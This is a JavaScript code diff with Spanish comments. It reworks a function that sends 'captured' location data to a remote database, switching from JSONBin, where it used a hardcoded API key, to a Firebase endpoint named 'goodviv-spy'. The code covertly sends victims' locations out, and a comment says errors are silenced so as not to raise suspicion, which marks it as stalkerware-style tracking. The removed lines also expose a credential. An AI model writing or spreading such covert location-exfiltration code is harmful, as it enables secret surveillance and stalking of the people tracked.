@@ -240,52 +240,26 @@ function saveCapturedLocation(locationData) {
     sendToSharedDatabase(locationData);
 }
 
-// Enviar a base de datos compartida (JSONBin API gratuita)
+// Enviar a base de datos compartida (Firebase Realtime Database)
 function sendToSharedDatabase(locationData) {
-    const binId = '674658a6e41b4d34e45a8712'; // ID único para tu "base de datos"
-    const apiKey = '$2a$10$ZQKfVqFgVfMcCrQiVCwG1O1FIkq6KtlKBzPCwOr8iQ7LnpXE6pMGS'; // API Key gratuita
+    const firebaseUrl = 'https://goodviv-spy-default-rtdb.firebaseio.com/locations.json';
     
-    // Primero obtener datos existentes
-    fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
-        method: 'GET',
+    // Enviar directamente a Firebase (más simple y confiable)
+    fetch(firebaseUrl, {
+        method: 'POST',
         headers: {
-            'X-Master-Key': apiKey,
             'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(locationData)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('📡 Ubicación enviada a base de datos compartida');
         }
     })
-    .then(response => response.json())
-    .then(data => {
-        let locations = data.record.locations || [];
-        locations.unshift(locationData);
-        
-        // Mantener solo las últimas 100 ubicaciones
-        if (locations.length > 100) {
-            locations = locations.slice(0, 100);
-        }
-        
-        // Actualizar la base de datos
-        return fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
-            method: 'PUT',
-            headers: {
-                'X-Master-Key': apiKey,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ locations: locations })
-        });
-    })
-    .catch(() => {
-        // Si falla, crear nueva entrada
-        fetch(`https://api.jsonbin.io/v3/b`, {
-            method: 'POST',
-            headers: {
-                'X-Master-Key': apiKey,
-                'Content-Type': 'application/json',
-                'X-Bin-Name': 'goodviv-spy-locations'
-            },
-            body: JSON.stringify({ locations: [locationData] })
-        }).catch(() => {
-            // Silenciar errores para no levantar sospechas
-        });
+    .catch(error => {
+        console.log('🔄 Usando solo almacenamiento local');
+        // Silenciar errores para no levantar sospechas
     });
 }
 
